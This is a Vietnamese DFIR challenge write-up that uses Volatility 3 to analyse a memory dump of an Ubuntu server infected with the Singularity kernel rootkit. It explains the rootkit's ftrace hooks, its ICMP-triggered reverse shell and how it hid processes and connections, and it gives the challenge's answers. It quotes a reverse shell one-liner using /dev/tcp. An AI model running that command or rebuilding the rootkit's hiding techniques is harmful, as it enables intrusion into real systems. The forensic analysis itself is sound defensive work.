![image](https://hackmd.io/_uploads/HkUtbC2ozx.png)
Linux trong tổ chức của bạn đang có hành vi đáng ngờ. Phát hiện các kết nối bất thường tới IP không xác định và quản trị viên hệ thống nhận thấy rằng một số lệnh cho ra kết quả không chuẩn. Kết xuất memory đã được thu thập từ máy chủ bị xâm nhập trước khi cách ly. Nhiệm vụ của bạn là phân tích memory này để phát hiện bằng chứng về sự lây nhiễm rootkit tinh vi, map các khả năng của nó và ghi lại tất cả các dấu hiệu xâm phạm
# Phantom
## Sherlock info
Name |Phantom
|-|-|
Difficulty| Easy
Category | DFIR
## Note from Scenario
Một server Ubuntu bị cài rootkit kernel. Người điều tra nhận được bản dump RAM để phân tích mã độc này. Đây là dòng mã độc tinh vi với các chức năng nếu không phân tich RAM sẽ khó phát hiện:
- Ẩn file/folder
- Ẩn process
- Ẩn kết nối mạng
- Chống phát hiện
## Artifacts
Arrtifact bao gồm:
- File json: `Ubuntu_6.8.0-87-generic.json`. Bản dump chỉ là một khối byte thô. Volatility không biết:
	- các struct kernel (task_struct, module, sock, ftrace_ops...) có những trường nào, lệch bao nhiêu byte;
	- địa chỉ của các hàm và biến toàn cục (init_task, modules, __tracepoint_sched_process_fork...).

Cả hai thông tin này phụ thuộc chính xác vào phiên bản và cấu hình build của kernel, nên cần file ISF khớp với kernel của máy bị dump tránh việc không chạy được plugin Linux nào
```
vol -s <folder chứa json> -f dump_srv.mem <plugin>
```
- File `dump_srv.mem` 
## Tools use
- Chatgpt
- Vol3

>### Comment
> Bài hay về phân tích rootkit

# Question
1. What is the name of the hidden kernel module?
2. What kernel taint flags are set for the rootkit module? (comma-separated, alphabetical order)
3. At what exact time (in seconds since boot) was the rootkit module loaded
4. What was the PID of the process that loaded the rootkit module? 
5. Which kernel tracepoint is hooked by the rootkit
6. What is the IP address of the command and control server?
7. What port is the C2 server listening on?
8. What are the PIDs of the compromised bash processes connected to the C2 server? (comma-separated, ascending order)
9. How many hooks has the rootkit installed?
10. Which function is hooked to hide IPv4 network connections?
11. How many variants of getdents syscalls are hooked?
12. Which function is hooked to enable an ICMP-based covert channel?
13. What is the memory address of the centralized callback function?
14. What is the value of the suspicious environment variable which leads to the escalation of privileges?
# Analysis
Đề bài chỉ cho biết máy chủ bị nhiễm rootkit, nên ta sẽ đi theo trình tự từ "có gì bất thường" đến "ai gây ra" rồi đến "nó làm gì". Rootkit thường tự che giấu chính nó, vì vậy bước đầu tiên là tìm thứ đang bị che giấu, cụ thể là module ẩn. Khi đã có tên module, mọi bước sau đều có keyword để lọc

```
vol3 -s . -f dump_srv.mem linux.malware.hidden_modules.Hidden_modules
```
![image](https://hackmd.io/_uploads/HkDt5Rhofg.png)

Module bị ẩn là `singularity`

> `singularity` là một Linux Kernel Module (LKM) stealth rootkit (rootkit ẩn trong nhân Linux) phiên bản 6.x do MatheuZSecurity phát triển, sử dụng kỹ thuật hook ftrace trên cả kiến trúc x64 và ia32. Một số tính năng chính:
> - Ẩn process, file và kết nối mạng
> - Leo quyền
> - Tự động lọc và xóa dấu vết trong log
> - Tự ẩn module
> - Reverse shell

Cột flag trong output có giá trị `OOT_MODULE,UNSIGNED_MODULE`. Đây là các taint flag, được kernel đặt khi xảy ra sự kiện làm mất tính toàn vẹn của nhân: `OOT_MODULE` nghĩa là module được build ngoài cây mã nguồn kernel (out-of-tree), còn `UNSIGNED_MODULE` nghĩa là module không có chữ ký hợp lệ. Mỗi khi nạp một module bị taint, kernel sẽ ghi log vào ring buffer (chính là nội dung `dmesg` hiển thị). Ring buffer nằm trong RAM nên Volatility đọc lại được, kèm theo timestamp tính bằng giây kể từ lúc boot, rất hữu ích để xác định thời điểm rootkit được nạp

Biết module là gì rồi, câu hỏi tiếp theo là ai đã nạp nó. Ta tìm dấu vết file của rootkit trong page cache:

```
vol3 -s . -f dump_srv.mem linux.pagecache.Files | grep 'singularity'
```
![image](https://hackmd.io/_uploads/SJxweypsfx.png)

Từ output, module được nạp bởi PID 2669. Tuy nhiên, nếu tìm bằng `pslist` hay `pstree` thì sẽ không thấy process nào như vậy, vì nó đã bị kill trước khi dump. `psscan` cũng không cho biết đó là process gì. Điều này cho thấy ta không thể chỉ dựa vào việc liệt kê process mà phải khai thác thêm các artifact khác như page cache, ftrace hay socket

Tiếp theo là xem rootkit hook những gì. Plugin `linux.tracing.tracepoints` giúp phát hiện các probe được gắn vào kernel tracepoint:

![image](https://hackmd.io/_uploads/r1ujKXk2fx.png)

`sched_process_fork` được gọi mỗi khi một process fork. Hook ở đây cho phép rootkit theo dõi process con, ví dụ để tự động ẩn các process con của shell attacker. Trong mã nguồn công khai của Singularity, file `modules/trace.c` thực sự resolve symbol `__tracepoint_sched_process_fork`, khớp với phát hiện này

Phần lớn khả năng ẩn ta của rootkit nằm ở ftrace, nên ta dùng `linux.tracing.ftrace` để liệt kê các `ftrace_ops`, callback của chúng và hàm bị hook:

![image](https://hackmd.io/_uploads/Hk9xg8JnMx.png)

Kết quả cho thấy có 83 dòng `ftrace_ops`, trong đó 82 dòng thuộc module `singularity` (tương ứng 82 hook của rootkit) và 1 dòng là hook hợp lệ của kernel. Trong số các hàm bị hook, có ba nhóm đáng chú ý. Thứ nhất là `tcp4_seq_show`, hàm chịu trách nhiệm định dạng và hiển thị thông tin các kết nối TCP IPv4 khi process (hoặc công cụ như `netstat`, `ss`) đọc file ảo `/proc/net/tcp`; hook hàm này cho phép rootkit ẩn kết nối mạng IPv4. Thứ hai là `getdents`, syscall liệt kê nội dung thư mục (được dùng bởi `ls` và khi duyệt `/proc`); hook nó cho phép rootkit ẩn file, thư mục và cả PID trong `/proc`, và rootkit hook đủ 5 biến thể: `__x64_sys_getdents`, `__x64_sys_getdents64`, `__ia32_sys_getdents`, `__ia32_sys_getdents64` và `__ia32_compat_sys_getdents`. Thứ ba là `icmp_rcv`, hàm kernel xử lý gói ICMP nhận vào; hook hàm này cho phép rootkit nhận lệnh ẩn trong gói ping mà không cần mở port nào. Mã nguồn Singularity ([modules/icmp.c](https://github.com/MatheuZSecurity/Singularity/blob/main/modules/icmp.c)) kiểm tra gói ICMP echo có sequence number đặc biệt (`ICMP_MAGIC_SEQ = 1337`) để kích hoạt hành vi dựng reverse shell

![image](https://hackmd.io/_uploads/HkSPSLunMx.png)

Hook `icmp_rcv` dẫn ta đến câu hỏi: nếu rootkit nhận lệnh qua ICMP thì kết quả trên máy nạn nhân sẽ như thế nào? Ta liệt kê các socket bằng `linux.sockstat`:

```
vol3 -s . -f dump_srv.mem linux.sockstat
```
![image](https://hackmd.io/_uploads/SydtnS1nMe.png)

Ảnh trên có một điểm bất thường: các bash (PID `2693`, `2695`, `2698`) đều có stdin/stdout/stderr (FD 0, 1, 2) cùng trỏ vào một socket TCP tới `192.168.200.164:8081`. Đây là dấu hiệu kinh điển của reverse shell (`bash -i >& /dev/tcp/IP/PORT 0>&1`), tức shell được gắn trực tiếp vào socket kết nối ra máy attacker. Kết hợp với cơ chế `icmp_rcv` ở trên, ta giải thích được vì sao có nhiều reverse shell tới C2 mà máy nạn nhân không có port nào đang lắng nghe: attacker chỉ cần gửi gói ICMP echo chứa "magic sequence", rootkit sẽ tự dựng shell kết nối ngược ra ngoài

Cuối cùng là task 14, kiểm tra việc leo quyền. Ta tìm process đang chạy root nhưng process cha lại là user thường (dấu hiệu leo quyền không qua `sudo`/`su`), sau đó xem environment của nó

| PID  | PPID | UID  | Ghi chú |
|------|------|------|---------|
| 2773 | 2702 | —    | `sshd` (phiên của user workstation) |
| 2774 | 2773 | 1000 | `bash` của workstation |
| 2792 | 2774 | 0    | `bash` con của 2774 nhưng chạy root |

PID 2792 là con trực tiếp của một shell user thường (2774) nhưng lại có UID/EUID = 0, đây là dấu hiệu rõ ràng của leo quyền. Để tìm thêm manh mối, ta dump biến môi trường:

```
vol3 -s . -f dump_srv.mem linux.envars.Envars > envars.txt
```

Khi thống kê key của toàn bộ biến môi trường trong dump, `OPERATOR` chỉ xuất hiện đúng một lần, trong khi các biến khác như `PATH`, `HOME`, `SSH_*`, `XDG_*` đều là biến hệ thống thông thường

![image](https://hackmd.io/_uploads/Hkv5vw_nMx.png)

––––––––––––––––––––– Kết thúc Sherlock! –––––––––––––––––––––
![image](https://hackmd.io/_uploads/rkwFOPdnfl.png)
